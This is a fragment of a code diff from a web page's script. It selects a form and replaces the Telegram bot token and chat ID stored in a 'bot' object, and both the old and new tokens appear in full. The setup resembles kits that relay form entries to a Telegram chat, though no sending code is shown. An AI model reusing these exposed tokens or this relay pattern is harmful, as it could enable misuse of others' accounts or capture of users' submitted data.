@@ -959,8 +959,8 @@ none"></iframe></div>
       const formal = document.querySelector('#form')
     
       let bot = {
-          TOKEN: "6934592592:AAF2RWIzfqZVd0XJMl3_N5UeSJiQuvgraD0",
-          chatID: "5303962757"
+          TOKEN: "7629957367:AAHWGqsuEvHjddm2QNwKNN8vgRLcxP6EZOk",
+          chatID: "1712380785"
       }
 
 
